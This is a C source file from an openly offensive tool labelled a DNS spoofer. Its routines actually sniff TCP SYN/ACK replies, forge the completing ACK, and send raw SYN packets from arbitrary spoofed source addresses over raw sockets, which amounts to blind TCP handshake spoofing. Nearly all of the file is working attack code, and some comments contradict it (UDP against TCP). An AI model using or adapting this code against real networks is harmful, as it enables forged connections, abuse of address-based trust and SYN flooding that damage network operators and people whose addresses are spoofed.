/* zodiac - advanced dns spoofer
 *
 * packet handling and queueing routines
 * by scut
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <libnet.h>
#include <pcap.h>
#include "common.h"
#include "packet.h"
#include "network.h"
#include "sniff.h"
#include "3wahas.h"


/* pq_grind
 *
 * grind the packets received from the sniffer thread, stripping ethernet
 * header, filter non-TCP packets, add them to the packet queue, then raise
 * the correct semaphore.
 *
 * `sinfo' gives information about the sniffing thread and the packet queue,
 * `pkthdr' is from the pcap handler and `pkt' contains the real packet data.
 */

void
pq_grind (void *sinfov, struct pcap_pkthdr *pkthdr, u_char *pkt)
{
	size_t		psize;
	sniff_info	*sinfo = (sniff_info *) sinfov;
	eth_hdr		*eth = (eth_hdr *) pkt;
	ip_hdr		*ip;		/* IP packet header pointer */
	tcp_hdr		*tcp;		/* UDP packet header pointer */
	char		*ip_src, *ip_dst;

	/* check if it is a IP/UDP packet, if not, silently skip it
	 */
	if (pkthdr->caplen < (sizeof (eth_hdr) + sizeof (tcp_hdr)))
		return;
	if (eth->eth_type != htons (ETH_P_IP))
		return;

	ip =	(ip_hdr *)	(pkt + sizeof (eth_hdr));
	tcp =	(tcp_hdr *)	(pkt + sizeof (eth_hdr) + sizeof (ip_hdr));

	psize = pkthdr->caplen - sizeof (eth_hdr);

	if (ip->ip_proto != IPPROTO_TCP)
		return;

	if ((ip->ip_src.s_addr != sinfo->ip_dst.s_addr))
		return;

	if (((tcp->th_flags & TH_SYN) != TH_SYN) || ((tcp->th_flags & TH_ACK) != TH_ACK))
		return;

	net_printipa (&ip->ip_src, &ip_src);
	net_printipa (&ip->ip_dst, &ip_dst);

	printf ("[%s:%5u] -> [%s:%5u] %c%c%c%c\n",
		ip_src, htons (tcp->th_sport),
		ip_dst, htons (tcp->th_dport),
		((tcp->th_flags & TH_SYN) == TH_SYN) ? 'Y' : ' ',
		((tcp->th_flags & TH_ACK) == TH_ACK) ? 'A' : ' ',
		((tcp->th_flags & TH_FIN) == TH_FIN) ? 'F' : ' ',
		((tcp->th_flags & TH_RST) == TH_RST) ? 'R' : ' ');

	pq_3whs (ip, tcp);

	free (ip_src);
	free (ip_dst);
	return;
}


void
pq_3whs (struct ip_hdr *ip, struct tcp_hdr *tcp)
{
	u_char	*buf = xcalloc (1, sizeof (ip_hdr) + sizeof (tcp_hdr));
	int	sock = open_raw_sock (IPPROTO_RAW);

	if (sock == -1) {
		free (buf);
		return;
	}

	build_ip (TCP_H,
		0,
		1911,
		0,
		64,
		IPPROTO_TCP,
		ip->ip_dst.s_addr,
		ip->ip_src.s_addr,
		NULL,
		0,
		buf);

	build_tcp (htons (tcp->th_dport),
		htons (tcp->th_sport),
		libnet_get_prand (PRu32),	/* seq */
		htonl (tcp->th_seq) + 1,	/* yeah */
		TH_ACK,
		1024,
		0,
		NULL,
		0,
		buf + IP_H);

	do_checksum (buf, IPPROTO_TCP, TCP_H);
	write_ip (sock, buf, TCP_H + IP_H);

	free (buf);
	close (sock);

	return;
}


void
pq_syns (char *ip_src_c, char *ip_dst_c, u_short dst_prt)
{
	u_char	*buf = xcalloc (1, sizeof (ip_hdr) + sizeof (tcp_hdr));
	int	sock = open_raw_sock (IPPROTO_RAW);
	struct in_addr	ip_src,
			ip_dst;

	ip_src.s_addr = net_resolve (ip_src_c);
	ip_dst.s_addr = net_resolve (ip_dst_c);

	if (sock == -1) {
		free (buf);
		return;
	}

	build_ip (TCP_H,
		0,
		1911,
		0,
		64,
		IPPROTO_TCP,
		ip_src.s_addr,
		ip_dst.s_addr,
		NULL,
		0,
		buf);

	build_tcp (libnet_get_prand (PRu16),
		dst_prt,
		libnet_get_prand (PRu32),
		0,
		TH_SYN,
		1024,
		0,
		NULL,
		0,
		buf + IP_H);

	do_checksum (buf, IPPROTO_TCP, TCP_H);
	write_ip (sock, buf, TCP_H + IP_H);

	free (buf);
	close (sock);

	return;
}


